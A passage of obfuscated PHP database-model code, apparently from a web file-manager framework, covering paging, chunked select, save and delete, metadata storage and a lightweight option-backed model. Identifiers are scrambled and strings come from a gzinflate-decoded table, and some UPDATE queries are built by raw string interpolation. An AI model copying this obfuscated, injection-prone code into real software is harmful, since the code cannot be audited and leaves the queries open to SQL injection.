Ö‘ñÄ”]; if (!isset($GLOBALS[$¶åŠÍš‹[371]])) { return; } $GLOBALS[$¶åŠÍš‹[7]][$¶åŠÍš‹[372]] = $GLOBALS[$¶åŠÍš‹[371]]; $GLOBALS[$¶åŠÍš‹[7]][$¶åŠÍš‹[362]] = $GLOBALS[$¶åŠÍš‹[373]]; if ($GLOBALS[$¶åŠÍš‹[7]][$¶åŠÍš‹[372]] === !1) { unset($GLOBALS[$¶åŠÍš‹[7]][$¶åŠÍš‹[372]]); } if ($GLOBALS[$¶åŠÍš‹[7]][$¶åŠÍš‹[362]] === !1) { unset($GLOBALS[$¶åŠÍš‹[7]][$¶åŠÍš‹[362]]); } unset($GLOBALS[$¶åŠÍš‹[371]]); unset($GLOBALS[$¶åŠÍš‹[373]]); } protected function selectPage($çëÅáµ = 200, $•­ ¿œú = 1) { $×òºå–õ =& $_SERVER[ Ö‘ñÄ”]; global $in; $ç©‘«±ù = $this->optionsValue(); $º±ÊêÍ† = 50000; $çëÅáµ = isset($in[$×òºå–õ[372]]) && $in[$×òºå–õ[372]] ? $in[$×òºå–õ[372]] : $çëÅáµ; if ($çëÅáµ === -1) { $in[$×òºå–õ[372]] = !1; $º±ÊêÍ† = 100000000; $çëÅáµ = $º±ÊêÍ†; } $ÌÌŒ™²â = $ç©‘«±ù; $ÌÌŒ™²â[$×òºå–õ[374]] = array(); $çëÅáµ = intval($çëÅáµ); $çëÅáµ = $çëÅáµ <= 5 ? 5 : ($çëÅáµ >= $º±ÊêÍ† ? $º±ÊêÍ† : $çëÅáµ); $•­ ¿œú = intval(isset($in[$×òºå–õ[362]]) && $in[$×òºå–õ[362]] ? $in[$×òºå–õ[362]] : $•­ ¿œú); $•­ ¿œú = $•­ ¿œú <= 1 ? 1 : $•­ ¿œú; $øıİ³éŠ = array(); $¨şı¯Ñ¯ = 1; if ($•­ ¿œú == 1 && $¨şı¯Ñ¯) { $this->optionsValue($ç©‘«±ù); $øıİ³éŠ = $this->page($•­ ¿œú, $çëÅáµ)->select(); $ñÛé·¤Ç = is_array($øıİ³éŠ) ? count($øıİ³éŠ) : 0; if ($ñÛé·¤Ç < $çëÅáµ) { $Äñ¶Ö¤ê = 1; } else { $this->optionsValue($ÌÌŒ™²â); $ñÛé·¤Ç = intval($this->count()); $Äñ¶Ö¤ê = ceil($ñÛé·¤Ç / $çëÅáµ); } } else { $this->optionsValue($ÌÌŒ™²â); $ñÛé·¤Ç = intval($this->count()); $Äñ¶Ö¤ê = ceil($ñÛé·¤Ç / $çëÅáµ); $•­ ¿œú = $•­ ¿œú >= $Äñ¶Ö¤ê ? $Äñ¶Ö¤ê : $•­ ¿œú; $this->optionsValue($ç©‘«±ù); $øıİ³éŠ = $this->page($•­ ¿œú, $çëÅáµ)->select(); } if (!is_array($øıİ³éŠ)) { $øıİ³éŠ = array(); } if ($Äñ¶Ö¤ê == 1) { $ñÛé·¤Ç = count($øıİ³éŠ); } $ÍÔ…ùæ = array($×òºå–õ[375] => array($×òºå–õ[376] => $ñÛé·¤Ç, $×òºå–õ[372] => $çëÅáµ, $×òºå–õ[362] => $•­ ¿œú, $×òºå–õ[377] => $Äñ¶Ö¤ê), $×òºå–õ[378] => $øıİ³éŠ); return $ÍÔ…ùæ; } protected function checkLength($˜©ÓÁæ, $Í¨ƒ¨Ï = 0, $ÅÔöòãÉ = '') { $Şú«ë¾¦ =& $_SERVER[ Ö‘ñÄ”]; $Í¨ƒ¨Ï = $Í¨ƒ¨Ï ? $Í¨ƒ¨Ï : 65536; if (!$˜©ÓÁæ || strlen($˜©ÓÁæ) < $Í¨ƒ¨Ï) { return; } $ÅÔöòãÉ = $ÅÔöòãÉ ? $ÅÔöòãÉ . $Şú«ë¾¦[71] : $Şú«ë¾¦[12]; show_json($ÅÔöòãÉ . LNG($Şú«ë¾¦[379]) . "\50{$Í¨ƒ¨Ï}\x29", !1); } protected function metaSet($¼Ö¼Ş£¼, $¸ØÙı˜ = null, $‘˜½ç¾¯ = null) { $¼Ä“ÙŠ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->tableMeta || !$¼Ö¼Ş£¼) { return !1; } $Å‘–ëÅÂ = $this->tableMeta[$¼Ä“ÙŠ[380]]; $¥ÎªùÈ„ = $this->tableMeta[$¼Ä“ÙŠ[381]]; $ıÑêÏÆç = Model($¥ÎªùÈ„); $îı›ÅÁ = array($Å‘–ëÅÂ => $¼Ö¼Ş£¼, $¼Ä“ÙŠ[382] => $¸ØÙı˜); if (is_null($¸ØÙı˜)) { return $ıÑêÏÆç->where(array($Å‘–ëÅÂ => $¼Ö¼Ş£¼))->delete(); } if (is_null($‘˜½ç¾¯) && is_string($¸ØÙı˜)) { return $ıÑêÏÆç->where($îı›ÅÁ)->delete(); } $€éúáĞ = is_array($¸ØÙı˜) ? $¸ØÙı˜ : array(); if (is_string($¸ØÙı˜)) { $€éúáĞ[$¸ØÙı˜] = $‘˜½ç¾¯; } $Ò¼èµ˜µ = array(); foreach ($€éúáĞ as $³™©ã—é => $ôÉâ…ƒ¥) { if (is_null($ôÉâ…ƒ¥) && is_string($³™©ã—é)) { $ıÑêÏÆç->where(array($Å‘–ëÅÂ => $¼Ö¼Ş£¼, $¼Ä“ÙŠ[382] => $³™©ã—é))->delete(); continue; } $this->checkLength($ôÉâ…ƒ¥, !1, $¥ÎªùÈ„ . $¼Ä“ÙŠ[4] . $³™©ã—é); $Ò¼èµ˜µ[] = array($Å‘–ëÅÂ => $¼Ö¼Ş£¼, $¼Ä“ÙŠ[94] => $³™©ã—é, $¼Ä“ÙŠ[383] => $ôÉâ…ƒ¥); } $•î €›¹ = $¼Ä“ÙŠ[384] . $¥ÎªùÈ„; CacheLock::lock($•î €›¹); $ıÑêÏÆç->where(array($Å‘–ëÅÂ => $¼Ö¼Ş£¼))->addAll($Ò¼èµ˜µ, array(), !0); CacheLock::unlock($•î €›¹); return !0; } public function metaGet($æüØ¯â¨, $½û‘¦É‹ = false) { $†÷ˆ¿ö =& $_SERVER[ Ö‘ñÄ”]; if (!$this->tableMeta) { return array(); } $±ùí•· = $this->tableMeta[$†÷ˆ¿ö[380]]; $²“õÁ‹° = Model($this->tableMeta[$†÷ˆ¿ö[381]]); if ($½û‘¦É‹) { $İ‚‘£Â = array($±ùí•· => $æüØ¯â¨, $†÷ˆ¿ö[94] => $½û‘¦É‹); return $²“õÁ‹°->where($İ‚‘£Â)->getField($†÷ˆ¿ö[383]); } $İ‚‘£Â = array($±ùí•· => $æüØ¯â¨); $ï˜¬Îô¯ = $²“õÁ‹°->field($†÷ˆ¿ö[385])->where($İ‚‘£Â)->select(); $ï˜¬Îô¯ = array_to_keyvalue($ï˜¬Îô¯, $†÷ˆ¿ö[94], $†÷ˆ¿ö[383]); return $ï˜¬Îô¯; } private function checkDataAutoHas($¿ˆäòÎ¢) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¥¾ãü¤é) { if (in_array($¿ˆäòÎ¢, explode($_SERVER[ Ö‘ñÄ”][50], $¥¾ãü¤é[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Å»ùñ˜, $ë–üÆ°) { $ø…¦Î¿‚ =& $_SERVER[ Ö‘ñÄ”]; if (!is_array($Å»ùñ˜)) { return; } foreach ($this->dataAuto as $½ÜçÌ˜) { $Ú±‰‡ïù = $½ÜçÌ˜[0]; if (!in_array($ë–üÆ°, explode($ø…¦Î¿‚[50], $½ÜçÌ˜[2]))) { continue; } switch (trim($½ÜçÌ˜[3])) { case $ø…¦Î¿‚[330]: case $ø…¦Î¿‚[331]: $ö´–ô± = $½ÜçÌ˜[1]; $ë€¬Æœº = isset($½ÜçÌ˜[4]) ? (array) $½ÜçÌ˜[4] : array(); if ($ö´–ô± == $ø…¦Î¿‚[203] && array_key_exists($Ú±‰‡ïù, $Å»ùñ˜)) { if (!$Å»ùñ˜[$Ú±‰‡ïù]) { unset($Å»ùñ˜[$Ú±‰‡ïù]); } break; } if (isset($Å»ùñ˜[$Ú±‰‡ïù])) { array_unshift($ë€¬Æœº, $Å»ùñ˜[$Ú±‰‡ïù]); } if ($ø…¦Î¿‚[330] == $½ÜçÌ˜[3]) { $Å»ùñ˜[$Ú±‰‡ïù] = call_user_func_array($ö´–ô±, $ë€¬Æœº); } else { $Å»ùñ˜[$Ú±‰‡ïù] = call_user_func_array(array(&$this, $ö´–ô±), $ë€¬Æœº); } break; case $ø…¦Î¿‚[279]: if (isset($Å»ùñ˜[$Ú±‰‡ïù]) && $Å»ùñ˜[$Ú±‰‡ïù]) { $Å»ùñ˜[$Ú±‰‡ïù] = call_user_func_array(array(&$this, $½ÜçÌ˜[1]), array($Å»ùñ˜[$Ú±‰‡ïù])); } break; case $ø…¦Î¿‚[282]: $Å»ùñ˜[$Ú±‰‡ïù] = $Å»ùñ˜[$½ÜçÌ˜[1]]; break; case $ø…¦Î¿‚[303]: if (isset($Å»ùñ˜[$Ú±‰‡ïù]) && !is_string($Å»ùñ˜[$Ú±‰‡ïù])) { $Å»ùñ˜[$Ú±‰‡ïù] = json_encode_force($Å»ùñ˜[$Ú±‰‡ïù]); } break; case $ø…¦Î¿‚[332]: if ($Å»ùñ˜[$Ú±‰‡ïù] === $ø…¦Î¿‚[12]) { unset($Å»ùñ˜[$Ú±‰‡ïù]); } break; case $ø…¦Î¿‚[333]: $Å»ùñ˜[$Ú±‰‡ïù] = $½ÜçÌ˜[1]; default: break; } } if ($ë–üÆ° == $ø…¦Î¿‚[364]) { $’Ûû‡ŞØ = strtolower($this->db->getDbType()); if (strpos($’Ûû‡ŞØ, $ø…¦Î¿‚[13]) !== 0) { return; } $á××Ëª¦ = $this->field(!0)->fields; $ûÂíéõØ = $á××Ëª¦[$ø…¦Î¿‚[261]]; if (isset($á××Ëª¦[$ø…¦Î¿‚[260]])) { unset($ûÂíéõØ[$á××Ëª¦[$ø…¦Î¿‚[260]]]); } foreach ($ûÂíéõØ as $†Õúäœ© => $ë–üÆ°) { if (!isset($Å»ùñ˜[$†Õúäœ©])) { $Å»ùñ˜[$†Õúäœ©] = $ø…¦Î¿‚[12]; } } } } private function dataAfterFilter(&$¬ößÁ“ö) { $ú–…‰ƒğ =& $_SERVER[ Ö‘ñÄ”]; foreach ($this->dataAuto as $Òª¦¡å) { $´Â»‹…® = $Òª¦¡å[0]; if (!isset($¬ößÁ“ö[$´Â»‹…®])) { continue; } if (!in_array($ú–…‰ƒğ[366], explode($ú–…‰ƒğ[50], $Òª¦¡å[2]))) { continue; } switch (trim($Òª¦¡å[3])) { case $ú–…‰ƒğ[330]: case $ú–…‰ƒğ[331]: $ïœ©©ÄÄ = isset($Òª¦¡å[4]) ? (array) $Òª¦¡å[4] : array(); array_unshift($ïœ©©ÄÄ, $¬ößÁ“ö[$´Â»‹…®]); if (isset($Òª¦¡å[4]) && $Òª¦¡å[4] == $ú–…‰ƒğ[386]) { $ïœ©©ÄÄ = array($¬ößÁ“ö[$´Â»‹…®]); } if ($ú–…‰ƒğ[330] == $Òª¦¡å[3]) { $¬ößÁ“ö[$´Â»‹…®] = call_user_func_array($Òª¦¡å[1], $ïœ©©ÄÄ); } else { $¬ößÁ“ö[$´Â»‹…®] = call_user_func_array(array(&$this, $Òª¦¡å[1]), $ïœ©©ÄÄ); } break; case $ú–…‰ƒğ[279]: if (isset($¬ößÁ“ö[$´Â»‹…®]) && $¬ößÁ“ö[$´Â»‹…®]) { $¬ößÁ“ö[$´Â»‹…®] = call_user_func_array(array(&$this, $Òª¦¡å[1]), array($¬ößÁ“ö[$´Â»‹…®])); } break; case $ú–…‰ƒğ[282]: $¬ößÁ“ö[$´Â»‹…®] = $¬ößÁ“ö[$Òª¦¡å[1]]; break; case $ú–…‰ƒğ[303]: $ûÆÖ‘É = $¬ößÁ“ö[$´Â»‹…®]; $¬ößÁ“ö[$´Â»‹…®] = json_decode($ûÆÖ‘É, !0); if (is_null($¬ößÁ“ö[$´Â»‹…®])) { $¬ößÁ“ö[$´Â»‹…®] = $ûÆÖ‘É; } break; case $ú–…‰ƒğ[332]: if ($¬ößÁ“ö[$´Â»‹…®] === $ú–…‰ƒğ[12]) { unset($¬ößÁ“ö[$´Â»‹…®]); } break; case $ú–…‰ƒğ[333]: $¬ößÁ“ö[$´Â»‹…®] = $Òª¦¡å[1]; break; default: break; } } } public function saveAll($Õ¿¢¹ì) { $ÑŸôÈßğ =& $_SERVER[ Ö‘ñÄ”]; $Ğì½ç« = $this->tablePrefix . $this->tableName; $¨®ıĞ€¤ = self::SQL_WHERE_IN_CHUNK; $Õ¿¢¹ì = is_array($Õ¿¢¹ì) ? $Õ¿¢¹ì : array(); $âˆØˆ­ = $ÑŸôÈßğ[246]; $‘ÏìƒÇ§ = 0; $Ä¦âæÌÚ = array(); $Ÿ½œéºŒ = count($Õ¿¢¹ì); for ($ğÜ­ˆŞ– = 0; $ğÜ­ˆŞ– < $Ÿ½œéºŒ; $ğÜ­ˆŞ–++) { $†±Ö£Í = $Õ¿¢¹ì[$ğÜ­ˆŞ–]; if (!is_array($†±Ö£Í) || count($†±Ö£Í) != 4) { continue; } $¨Åè‘â¬ = "\x55\120\104\x41\x54\x45\x20\140{$Ğì½ç«}\140\x20\123\x45\x54\40{$†±Ö£Í[2]}\40\75\x20\103\x41\123\x45\x20{$†±Ö£Í[0]}\40\xa"; if ($‘ÏìƒÇ§ == 0) { $âˆØˆ­ = $¨Åè‘â¬; } $Ä¦âæÌÚ[] = $ÑŸôÈßğ[118] . $†±Ö£Í[1] . $ÑŸôÈßğ[118]; $‘ÏìƒÇ§++; $âˆØˆ­ .= "\40\127\110\x45\116\x20\x27{$†±Ö£Í[1]}\47\x20\124\110\105\x4e\x20\47{$†±Ö£Í[3]}\x27\x20\xa"; if ($‘ÏìƒÇ§ == $¨®ıĞ€¤ || $ğÜ­ˆŞ– == $Ÿ½œéºŒ - 1) { $ÊÌ€è¤· = implode($ÑŸôÈßğ[50], $Ä¦âæÌÚ); $âˆØˆ­ .= "\40\105\x4e\x44\x20\x20\x57\110\x45\122\x45\x20{$†±Ö£Í[0]}\x20\x49\x4e\40\x28{$ÊÌ€è¤·}\51\x20"; $this->execute($âˆØˆ­); $‘ÏìƒÇ§ = 0; $âˆØˆ­ = $¨Åè‘â¬; $this->chunkEventCheck(count($Ä¦âæÌÚ)); $Ä¦âæÌÚ = array(); } } $this->chunkEventSet(); } public function saveAllEach($‘Ø€óÓú) { $¶äÍ×ëÅ =& $_SERVER[ Ö‘ñÄ”]; $ô—¡Á› = $this->tablePrefix . $this->tableName; foreach ($‘Ø€óÓú as $¤ÇÀë Û) { if (!is_array($¤ÇÀë Û) || count($¤ÇÀë Û) != 4) { continue; } $³·â¿‰¯ = $¤ÇÀë Û[0] . $¶äÍ×ëÅ[387] . $¤ÇÀë Û[1] . $¶äÍ×ëÅ[118]; $´˜ÇéøÂ = $¤ÇÀë Û[2] . $¶äÍ×ëÅ[387] . $¤ÇÀë Û[3] . $¶äÍ×ëÅ[118]; $à°Ï©» = "\165\x70\144\x61\x74\145\40{$ô—¡Á›}\x20\x73\x65\x74\40{$´˜ÇéøÂ}\x20\x77\x68\145\x72\145\40{$³·â¿‰¯}\73"; $this->execute($à°Ï©»); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($€¼­úŒ½ = false, $µ×¾Å  = false) { $this->_chunkEvent = $€¼­úŒ½; $this->_chunkEventParam = $µ×¾Å ; } private function chunkEventCheck($È‰¡ç’¤) { if (!$this->_chunkEvent) { return; } $–©í‡ö = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $–©í‡ö[$_SERVER[ Ö‘ñÄ”][388]] = $È‰¡ç’¤; Hook::trigger($this->_chunkEvent, $–©í‡ö); } public function addAll($ÉŠëë¾À, $ÎúğÛëæ = array(), $Ü÷µõİ» = false) { $Ø‡¥ÒÀó =& $_SERVER[ Ö‘ñÄ”]; ignore_timeout(); $˜èêòÆ = self::SQL_WHERE_IN_CHUNK; if (empty($ÉŠëë¾À)) { $this->error = think_lang($Ø‡¥ÒÀó[280]); return !1; } $ÎúğÛëæ = $this->_parseOptions($ÎúğÛëæ); foreach ($ÉŠëë¾À as $ç¼şëâ => $õº¹¨íÉ) { $ÉŠëë¾À[$ç¼şëâ] = $this->_facade($õº¹¨íÉ); $this->_beforeInsert($ÉŠëë¾À[$ç¼şëâ], $ÎúğÛëæ); } if (method_exists($this->db, $Ø‡¥ÒÀó[281])) { for ($Åùñ›óã = 0; $Åùñ›óã < count($ÉŠëë¾À); $Åùñ›óã += $˜èêòÆ) { $‘Ê¨ïİä = array_slice($ÉŠëë¾À, $Åùñ›óã, $˜èêòÆ); if (!is_array($‘Ê¨ïİä) || count($‘Ê¨ïİä) == 0) { break; } $ËÛ°ˆÙ« = $this->db->insertAll($‘Ê¨ïİä, $ÎúğÛëæ, $Ü÷µõİ»); $this->chunkEventCheck(count($‘Ê¨ïİä)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÉŠëë¾À as $ç¼şëâ => $õº¹¨íÉ) { $ËÛ°ˆÙ« = $this->db->insert($õº¹¨íÉ, $ÎúğÛëæ, $Ü÷µõİ»); } $this->commit(); } if (!1 !== $ËÛ°ˆÙ«) { $ı‡è¼áÛ = $this->getLastInsID(); if ($ı‡è¼áÛ) { return $ı‡è¼áÛ; } } return $ËÛ°ˆÙ«; } public function save($¶Ã©Êâ· = '', $ş½èÚ™« = array()) { $Õõ„ßı„ =& $_SERVER[ Ö‘ñÄ”]; $ÇˆÇòŸŸ = self::SQL_WHERE_IN_CHUNK; $ËÑÙô€ = $this->optionsValue(); $ô¯äà = $this->findWhereField($ËÑÙô€); if (!$ô¯äà) { return parent::save($¶Ã©Êâ·, $ş½èÚ™«); } $Ë‚Û¯ƒë = 0; $Î¨ççş¢ = $ËÑÙô€[$Õõ„ßı„[284]][$ô¯äà][1]; $Î¨ççş¢ = is_array($Î¨ççş¢) ? $Î¨ççş¢ : array(); $Â¦¨¬¾÷ = count($Î¨ççş¢); for ($„Š İı· = 0; $„Š İı· < $Â¦¨¬¾÷; $„Š İı· += $ÇˆÇòŸŸ) { $Ö°¶•‰à = array_slice($Î¨ççş¢, $„Š İı·, $ÇˆÇòŸŸ); if (!is_array($Ö°¶•‰à) || count($Ö°¶•‰à) == 0) { break; } $ËÑÙô€[$Õõ„ßı„[284]][$ô¯äà][1] = $Ö°¶•‰à; $this->optionsValue($ËÑÙô€); $Ë‚Û¯ƒë += parent::save($¶Ã©Êâ·, $ş½èÚ™«); $this->chunkEventCheck(count($Ö°¶•‰à)); } $this->chunkEventSet(); return $Ë‚Û¯ƒë; } public function add($Ç¸é©ïğ = '', $ÃûŒ‹Áí = array(), $£”Œ‡Æ¥ = false) { if ($this->addTaskStatus && is_array($Ç¸é©ïğ)) { $this->addTaskData[] = $Ç¸é©ïğ; return; } return parent::add($Ç¸é©ïğ, $ÃûŒ‹Áí, $£”Œ‡Æ¥); } public function parseWhereLike($Û…İßé, $Â„³…Øè = '', $©â“æ›À = false, &$›’ëÂè² = false) { $¡”şûÊÂ =& $_SERVER[ Ö‘ñÄ”]; $ö›¾ªÑ… = $GLOBALS[$¡”şûÊÂ[6]][$¡”şûÊÂ[389]]; if (!$ö›¾ªÑ…[$¡”şûÊÂ[390]]) { return $Û…İßé; } if (!is_array($Û…İßé)) { return $Û…İßé; } $†Ş²¤è = array(); $ú£ØÑ¬Ô = 0; foreach ($Û…İßé as $¹äÃŸò => $Öº–å‡) { if (is_array($Öº–å‡) && count($Öº–å‡) == 2 && $Öº–å‡[0] == $¡”şûÊÂ[391] && is_string($Öº–å‡[1]) && substr($Öº–å‡[1], 0, 1) == $¡”şûÊÂ[392] && substr($Öº–å‡[1], strlen($Öº–å‡[1]) - 1, 1) == $¡”şûÊÂ[392]) { $›’ëÂè² = !0; $Œ¡ôÊüã = is_string($¹äÃŸò) ? $¹äÃŸò : $Â„³…Øè; $‰ÇÌµø£ = substr($Öº–å‡[1], 1, strlen($Öº–å‡[1]) - 2); $‰ÇÌµø£ = $this->db->escapeString($‰ÇÌµø£); if (!strpos($Œ¡ôÊüã, $¡”şûÊÂ[10])) { $Œ¡ôÊüã = $¡”şûÊÂ[393] . $Œ¡ôÊüã . $¡”şûÊÂ[393]; } $À¥è€‡§ = $¡”şûÊÂ[188] . $‰ÇÌµø£ . $¡”şûÊÂ[188]; $‰ÇÌµø£ = str_replace(array($¡”şûÊÂ[10], $¡”şûÊÂ[394], $¡”şûÊÂ[11]), $¡”şûÊÂ[395], $‰ÇÌµø£); if ($ö›¾ªÑ…[$¡”şûÊÂ[396]]) { $À¥è€‡§ = $¡”şûÊÂ[397] . $‰ÇÌµø£ . $¡”şûÊÂ[398]; if ($ö›¾ªÑ…[$¡”şûÊÂ[399]]) { $À¥è€‡§ = $¡”şûÊÂ[398] . $‰ÇÌµø£ . $¡”şûÊÂ[397]; } } $†Ş²¤è[$ú£ØÑ¬Ô] = $¡”şûÊÂ[400] . $Œ¡ôÊüã . $¡”şûÊÂ[401] . $À¥è€‡§ . $¡”şûÊÂ[402]; $ú£ØÑ¬Ô++; continue; } if (is_array($Öº–å‡)) { $Â„³…Øè = is_string($¹äÃŸò) ? $¹äÃŸò : $Â„³…Øè; $Öº–å‡ = $this->parseWhereLike($Öº–å‡, $Â„³…Øè, !0, $›’ëÂè²); } if (is_numeric($¹äÃŸò)) { $†Ş²¤è[$ú£ØÑ¬Ô] = $Öº–å‡; $ú£ØÑ¬Ô++; } else { $†Ş²¤è[$¹äÃŸò] = $Öº–å‡; } } if ($›’ëÂè² && !$©â“æ›À) { } return $†Ş²¤è; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÃÂ½è‚÷ = array()) { $º×ÀËµé =& $_SERVER[ Ö‘ñÄ”]; $Ü¥õ­øË = self::SQL_WHERE_IN_CHUNK; $â‚¶©“İ = $this->optionsValue(); $òª£â÷Á = $this->findWhereField($â‚¶©“İ); if (!$òª£â÷Á || isset($â‚¶©“İ[$º×ÀËµé[301]]) || isset($â‚¶©“İ[$º×ÀËµé[362]])) { return parent::select($ÃÂ½è‚÷); } $Ãˆ¹¤Æ = $â‚¶©“İ[$º×ÀËµé[284]][$òª£â÷Á][1]; $Ãˆ¹¤Æ = is_array($Ãˆ¹¤Æ) ? $Ãˆ¹¤Æ : array(); $çŒĞÅõ– = null; for ($ı€¹ÇÆí = 0; $ı€¹ÇÆí < count($Ãˆ¹¤Æ); $ı€¹ÇÆí += $Ü¥õ­øË) { $Æ–øöèş = array_slice($Ãˆ¹¤Æ, $ı€¹ÇÆí, $Ü¥õ­øË); if (!is_array($Æ–øöèş) || count($Æ–øöèş) == 0) { break; } $â‚¶©“İ[$º×ÀËµé[284]][$òª£â÷Á][1] = $Æ–øöèş; $this->optionsValue($â‚¶©“İ); $´§î‹ì = parent::select($ÃÂ½è‚÷); if (!$´§î‹ì) { continue; } $çŒĞÅõ– = is_array($çŒĞÅõ–) ? $çŒĞÅõ– : array(); $çŒĞÅõ– = array_merge($çŒĞÅõ–, $´§î‹ì); } return $çŒĞÅõ–; } public function delete($õû†å˜í = array()) { $Éˆï­ÓŸ =& $_SERVER[ Ö‘ñÄ”]; $òş•Ïã = self::SQL_WHERE_IN_CHUNK; $ŠŠª“­Ç = $this->optionsValue(); $®Óå€úò = $this->findWhereField($ŠŠª“­Ç); if (!$®Óå€úò) { return parent::delete($õû†å˜í); } $ßú¹ïç© = 0; $óÀ“¨¶ì = $ŠŠª“­Ç[$Éˆï­ÓŸ[284]][$®Óå€úò][1]; $óÀ“¨¶ì = is_array($óÀ“¨¶ì) ? $óÀ“¨¶ì : array(); for ($æØµÅÜƒ = 0; $æØµÅÜƒ < count($óÀ“¨¶ì); $æØµÅÜƒ += $òş•Ïã) { $ß¹Ö¹Ã¶ = array_slice($óÀ“¨¶ì, $æØµÅÜƒ, $òş•Ïã); if (!is_array($ß¹Ö¹Ã¶) || count($ß¹Ö¹Ã¶) == 0) { break; } $ŠŠª“­Ç[$Éˆï­ÓŸ[284]][$®Óå€úò][1] = $ß¹Ö¹Ã¶; $this->optionsValue($ŠŠª“­Ç); $ßú¹ïç© += parent::delete($õû†å˜í); } return $ßú¹ïç©; } private function findWhereField($â”ûèˆë) { $ÔÈˆÇ  =& $_SERVER[ Ö‘ñÄ”]; $”Ì§Êˆú = self::SQL_WHERE_IN_CHUNK; if (!is_array($â”ûèˆë) || !is_array($â”ûèˆë[$ÔÈˆÇ [284]])) { return !1; } foreach ($â”ûèˆë[$ÔÈˆÇ [284]] as $Ş·Ääœæ => $ıĞ¤ÚÙ²) { if (is_array($ıĞ¤ÚÙ²) && isset($ıĞ¤ÚÙ²[0]) && is_string($ıĞ¤ÚÙ²[0]) && strtolower($ıĞ¤ÚÙ²[0]) == $ÔÈˆÇ [7] && is_array($ıĞ¤ÚÙ²[1]) && count($ıĞ¤ÚÙ²[1]) > $”Ì§Êˆú) { ignore_timeout(); return $Ş·Ääœæ; } } return !1; } public function setMasterDB($€¤êéäê = true) { think_config($_SERVER[ Ö‘ñÄ”][403], $€¤êéäê); } } goto E‰é›¼Ğ„Œ; cáá£áÇçà: define($_SERVER[ Ö‘ñÄ”][0], $_SERVER[ Ö‘ñÄ”][1]); $_SERVER[¼ˆôê­] = explode($_SERVER[ Ö‘ñÄ”][2], gzinflate(substr($_SERVER[ Ö‘ñÄ”][3], 10, -8))); function binCheckEq($¬ìğÒû®, $ÈÕ’÷å) { return $¬ìğÒû® == $ÈÕ’÷å; } goto FáŠ‡–Ê´; E‰é›¼Ğ„Œ: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\x65\155\x4f\x70\x74\151\157\x6e"; public $field = array(); public function listData($Á£ÌØ½Ö = false, $¡‚â¡İñ = "\155\157\x64\x69\146\x79\124\x69\x6d\145", $Æµ¿Ş¶­ = false) { $Ò˜ªûæÏ = Model($this->modelType)->get(!1, $this->optionType, !0); $ËìõÔ…ü = array_values($Ò˜ªûæÏ); if ($ËìõÔ…ü && $ËìõÔ…ü[0] && !is_array($ËìõÔ…ü[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ò˜ªûæÏ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ò˜ªûæÏ) { return $Á£ÌØ½Ö ? null : array(); } if (!$Á£ÌØ½Ö) { $Ò˜ªûæÏ = array_filter(array_values($Ò˜ªûæÏ)); return array_sort_by($Ò˜ªûæÏ, $¡‚â¡İñ, $Æµ¿Ş¶­); } return $Ò˜ªûæÏ[$_SERVER[ Ö‘ñÄ”][404] . $Á£ÌØ½Ö]; } public function insert($È×°¡ˆÎ) { $ŒÑÆùÍğ =& $_SERVER[ Ö‘ñÄ”]; $È×°¡ˆÎ = array_field_key($È×°¡ˆÎ, $this->field); $÷êÑ×©’ = Model($this->modelType)->get($ŒÑÆùÍğ[405], $this->optionType . $ŒÑÆùÍğ[406]); $÷êÑ×©’ = $÷êÑ×©’ ? $÷êÑ×©’ : 0; $È×°¡ˆÎ[$ŒÑÆùÍğ[407]] = ++$÷êÑ×©’; $È×°¡ˆÎ[$ŒÑÆùÍğ[200]] = time(); $È×°¡ˆÎ[$ŒÑÆùÍğ[85]] = time(); Model($this->modelType)->set($ŒÑÆùÍğ[405], $÷êÑ×©’, $this->optionType . $ŒÑÆùÍğ[406]); Model($this->modelType)->set($ŒÑÆùÍğ[404] . $÷êÑ×©’, $È×°¡ˆÎ, $this->optionType); return $÷êÑ×©’; } public function update($—æøş©, $Š²Ô„”ù) { $óÒÈºĞ¢ =& $_SERVER[ Ö‘ñÄ”]; $Š²Ô„”ù = array_field_key($Š²Ô„”ù, $this->field); $Öş€™Òñ = $this->listData($—æøş©); if (!$Öş€™Òñ || !$—æøş©) { return !1; } $Š²Ô„”ù = array_merge($Öş€™Òñ, $Š²Ô„”ù); $Š²Ô„”ù[$óÒÈºĞ¢[85]] = time(); return Model($this->modelType)->set($óÒÈºĞ¢[404] . $—æøş©, $Š²Ô„”ù, $this->optionType); } public function remove($Ÿ‰Ö¤Ûà) { if (!$Ÿ‰Ö¤Ûà) { return !1; } return Model($this->modelType)->remove($_SERVER[ Ö‘ñÄ”][404] . $Ÿ‰Ö¤Ûà, $this->optionType); } public function clear() { $àŠİŒŠä =& $_SERVER[ Ö‘ñÄ”]; Model($this->modelType)->remove($àŠİŒŠä[405], $this->optionType . $àŠİŒŠä[406]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($»”¹î¼, $Ğı»ÀîŒ) { if (!$Ğı»ÀîŒ) { return !1; } $Ë«—êÙÄ = $this->listData(); $Ë«—êÙÄ = array_to_keyvalue($Ë«—êÙÄ, $»”¹î¼); return isset($Ë«—êÙÄ[$Ğı»ÀîŒ]) ? $Ë«—êÙÄ[$Ğı»ÀîŒ] : !1; } public function findByName($’âŞ†) { return $this->findByKey($_SERVER[ Ö‘ñÄ”][32], $’âŞ†); } protected function resetData($ Óî¬çá) { $í’ñÓÅ€ =& $_SERVER[ Ö‘ñÄ”]; $ Óî¬çá = is_array($ Óî¬çá) ? $ Óî¬çá : array(); $åØ‚¶É› = array(); for ($÷Êøà‰Š = 0; $÷Êøà‰Š < count($ Óî¬çá); $÷Êøà‰Š++) { $åØ‚¶É›[$í’ñÓÅ€[404] . $ Óî¬çá[$÷Êøà‰Š][$í’ñÓÅ€[407]]] = $ Óî¬çá[$÷Êøà‰Š]; } return 